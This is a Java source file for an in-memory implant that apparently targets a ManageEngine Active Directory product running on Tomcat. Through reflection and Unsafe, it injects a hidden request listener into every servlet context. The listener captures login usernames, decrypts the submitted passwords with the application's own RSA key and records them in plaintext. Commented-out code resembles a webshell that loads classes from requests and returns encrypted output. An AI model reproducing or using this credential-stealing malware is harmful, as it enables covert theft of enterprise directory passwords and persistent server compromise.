import com.adventnet.sym.adsm.security.server.RSAKeyPairGenerator;
import sun.misc.Unsafe;

import java.io.PrintWriter;
import java.lang.reflect.*;
import java.util.*;

public class RecordPassword extends ClassLoader implements InvocationHandler {
    private static Object unsafe;
    private static ArrayList userinfo = new ArrayList<>();


    static {
        new RecordPassword().addListener();
    }

    public RecordPassword(ClassLoader loader) {
        super(loader);
    }

    public RecordPassword() {

    }

    private void addListener() {
        try {
            Class servletRequestListenerClass = null;
            try {
                servletRequestListenerClass = loadClasses("jakarta.servlet.ServletRequestListener");
            } catch (Exception e) {
                try {
                    servletRequestListenerClass = loadClasses("javax.servlet.ServletRequestListener");
                } catch (ClassNotFoundException ex) {

                }
            }
            if (servletRequestListenerClass != null) {
                addListener(Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, this));
            }
        } catch (Throwable e) {

        }
    }

    public Class loadClasses(String className) throws ClassNotFoundException {
        ArrayList classLoaders = new ArrayList();
        classLoaders.add(this.getClass().getClassLoader());
        try {
            classLoaders.add(Thread.currentThread().getContextClassLoader());
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            int threadCount = threadGroup.activeCount();
            Thread[] threads = new Thread[threadCount];
            threadCount = threadGroup.enumerate(threads);
            for (int i = 0; i < threadCount; i++) {
                classLoaders.add(threads[i].getContextClassLoader());
            }
        } catch (Exception e) {

        }
        int loaders = classLoaders.size();
        for (int i = 0; i < loaders; i++) {
            ClassLoader loader = (ClassLoader) classLoaders.get(i);
            if (loader != null) {
                try {
                    return Class.forName(className, true, loader);
                } catch (Throwable e) {

                }
            }
        }
        return Class.forName(className);
    }


    public Object[] getStandardContexts() throws Throwable {
        HashSet contexts = new HashSet();
        HashSet blackType = new HashSet();
        blackType.add(int.class.getName());
        blackType.add(short.class.getName());
        blackType.add(long.class.getName());
        blackType.add(double.class.getName());
        blackType.add(byte.class.getName());
        blackType.add(float.class.getName());
        blackType.add(char.class.getName());
        blackType.add(boolean.class.getName());
        blackType.add(Integer.class.getName());
        blackType.add(Short.class.getName());
        blackType.add(Long.class.getName());
        blackType.add(Double.class.getName());
        blackType.add(Byte.class.getName());
        blackType.add(Float.class.getName());
        blackType.add(Character.class.getName());
        blackType.add(Boolean.class.getName());
        blackType.add(String.class.getName());

        Class standardContextClass = loadClasses("org.apache.catalina.core.StandardContext");
        HashSet blackValues = new HashSet();
        blackValues.add(System.identityHashCode(blackValues));

        Object obj = searchObject(standardContextClass, Thread.currentThread().getContextClassLoader(), blackValues, blackType, 30, 0);
        if (obj == null) {
            obj = searchObject(standardContextClass, Thread.currentThread(), blackValues, blackType, 30, 0);
        }

        if (obj != null) {
            contexts.add(obj);
            try {
                Map contextMap = (Map) getFieldValue(getFieldValue(obj, "parent"), "children");
                contexts.addAll(contextMap.values());
            } catch (Exception e) {

            }

            try {
                Map hosts = (Map) getFieldValue(getFieldValue(getFieldValue(obj, "parent"), "parent"), "children");
                Iterator iterator = hosts.values().iterator();
                while (iterator.hasNext()) {
                    Object host = iterator.next();
                    if (host != null) {
                        Map contextMap = (Map) getFieldValue(host, "children");
                        contexts.addAll(contextMap.values());
                    }
                }
            } catch (Exception e) {

            }
        }
        return contexts.toArray();
    }

    public Object searchObject(Class targetClas, Object object, HashSet blacklist, HashSet blackType, int maxDepth, int currentDepth) throws Throwable {
        currentDepth++;

        if (currentDepth >= maxDepth) {
            return null;
        }

        if (object != null) {

            if (targetClas.isInstance(object)) {
                return object;
            }

            Integer hash = System.identityHashCode(object);
            if (!blacklist.contains(hash)) {
                blacklist.add(new Integer(hash));
                Field[] fields = null;
                ArrayList fieldsArray = new ArrayList();
                Class objClass = object.getClass();
                while (objClass != null) {
                    Field[] fields1 = objClass.getDeclaredFields();
                    fieldsArray.addAll(Arrays.asList(fields1));
                    objClass = objClass.getSuperclass();
                }
                fields = (Field[]) fieldsArray.toArray(new Field[0]);


                for (int i = 0; i < fields.length; i++) {
                    Field field = fields[i];

                    try {
                        Class fieldType = field.getType();
                        if (!blackType.contains(fieldType.getName())) {
                            Object fieldValue = getFieldValue(field, object);
                            if (fieldValue != null) {
                                Object ret = null;

                                if (fieldValue instanceof Map) {
                                    Set set = ((Map) fieldValue).entrySet();
                                    Iterator iterator = set.iterator();
                                    while (iterator.hasNext()) {
                                        Map.Entry entry = (Map.Entry) iterator.next();
                                        ret = searchObject(targetClas, entry.getValue(), blacklist, blackType, maxDepth, currentDepth);
                                        if (ret != null) {
                                            break;
                                        }
                                        ret = searchObject(targetClas, entry.getKey(), blacklist, blackType, maxDepth, currentDepth);
                                        if (ret != null) {
                                            break;
                                        }
                                    }
                                } else if (fieldValue instanceof Iterable) {
                                    Iterator iterator = ((Iterable) fieldValue).iterator();
                                    while (iterator.hasNext()) {
                                        ret = searchObject(targetClas, iterator.next(), blacklist, blackType, maxDepth, currentDepth);
                                        if (ret != null) {
                                            break;
                                        }
                                    }
                                } else if (fieldType.isArray()) {
                                    if (!blackType.contains(fieldType.getComponentType().getName())) {
                                        int arraySize = Array.getLength(fieldValue);
                                        for (int j = 0; j < arraySize; j++) {
                                            ret = searchObject(targetClas, Array.get(fieldValue, j), blacklist, blackType, maxDepth, currentDepth);
                                            if (ret != null) {
                                                break;
                                            }
                                        }
                                    }
                                } else {
                                    ret = searchObject(targetClas, fieldValue, blacklist, blackType, maxDepth, currentDepth);
                                }
                                if (ret != null) {
                                    return ret;
                                }
                            }
                        }
                    } catch (Throwable e) {

                    }
                }
            }
        }
        return null;

    }

    private boolean addListener(Object listener) throws Throwable {
        Object[] standardContexts = getStandardContexts();

        boolean isOk = false;

        for (int i = 0; i < standardContexts.length; i++) {
            Object standardContext = standardContexts[i];
            Object[] listenerObjects = null;
            try {
                listenerObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
            } catch (Exception e) {

            }

            List listenerList = null;

            try {
                listenerList = (List) getFieldValue(standardContext, "applicationEventListenersList");
            } catch (Exception e) {

            }


            if (listenerObjects != null) {
                Object[] newListenerObjects = new Object[listenerObjects.length + 1];
                System.arraycopy(listenerObjects, 0, newListenerObjects, 0, listenerObjects.length);
                newListenerObjects[newListenerObjects.length - 1] = listener;
                getField(standardContext, "applicationEventListenersObjects").set(standardContext, newListenerObjects);
                isOk = true;
            } else if (listenerList != null) {
                listenerList.add(listener);
                isOk = true;
            } else {
                try {
                    Method addApplicationEventListenerMethod = getMethodByClass(standardContext.getClass(), "addApplicationEventListener", Object.class);
                    addApplicationEventListenerMethod.setAccessible(true);
                    addApplicationEventListenerMethod.invoke(standardContext, listener);
                    isOk = true;
                } catch (Exception e) {

                }
            }

        }


        return isOk;
    }


    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("requestInitialized")) {
            Object servletRequestEvent = args[0];
            run(servletRequestEvent);
        }
        return null;
    }

    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; i++) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add(null);
                    }
                }
            }
            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        } catch (Exception e) {
//        	e.printStackTrace();
        }
        return null;
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getMethod(methodName, parameters);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }

        if (method != null) {
            try {
                method.setAccessible(true);
            } catch (Throwable e) {

            }
        }

        return method;
    }

    public Unsafe getUnsafe() throws Exception {
        if (unsafe == null) {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field theUnsafe = unsafeClass.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            unsafe = theUnsafe.get(null);
        }
        return (Unsafe) unsafe;
    }

    public Field getField(Object obj, String fieldName) {
        Class clazz = null;

        if (obj == null) {
            return null;
        }

        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null) {
            field.setAccessible(true);
        }

        return field;
    }

    public Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            f = getField(obj, fieldName);
        }

        if (f != null) {
            return getFieldValue(f, obj);
        }
        return null;
    }

    public Object getFieldValue(Field field, Object value) throws Exception {
        try {
            field.setAccessible(true);
        } catch (Exception e) {
            Unsafe unsafe = getUnsafe();
            if (!field.getType().isPrimitive()) {
                if (Modifier.isStatic(field.getModifiers())) {
                    return unsafe.staticFieldBase(field);
                } else {
                    return unsafe.getObject(value, unsafe.objectFieldOffset(field));
                }
            }
        }
        return field.get(value);
    }


    public String getParameter(Object requestObject, String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }

    private void run(Object servletRequestEvent) {
        try {
            Object request = invokeMethod(servletRequestEvent, "getServletRequest");
            try {
                ClassLoader loader = Thread.currentThread().getContextClassLoader();
                if (loader == null) {
                    loader = request.getClass().getClassLoader();
                }
                String username = getParameter(request,"j_username");
                String password = getParameter(request,"j_password");
                if(username!=null && password!=null){
                    userinfo.add(username+" "+ RSAKeyPairGenerator.getInstance().decrypt(password));
                }

//                                payloadClass = new RecordPassword(loader).defineClass(data, 0, data.length);
//                            } else {
//                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
//                                Object f = payloadClass.newInstance();
//                                f.equals(arrOut);
//                                f.equals(request);
//                                f.equals(data);
//                                f.toString();
//                                String md5 = md5(password + key);
//                                if (arrOut.size() > 0) {
//                                    Object response = getFieldValue(getFieldValue(request, "request"), "response");
//                                    PrintWriter printWriter = (PrintWriter) invokeMethod(response, "getWriter");
//                                    printWriter.write(md5.substring(0, 16));
//                                    printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
//                                    printWriter.write(md5.substring(16));
//                                    printWriter.flush();
//                                    printWriter.close();
//                                    setFieldValue(response, "usingWriter", Boolean.FALSE);
//                                    setFieldValue(response, "usingOutputStream", Boolean.FALSE);
//                                    setFieldValue(response, "appCommitted", Boolean.FALSE);
//                                    setFieldValue(getFieldValue(response, "coyoteResponse"), "committed", Boolean.FALSE);
//                                }
//                            }
//                        }
//                    }

            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {

        }
    }

}
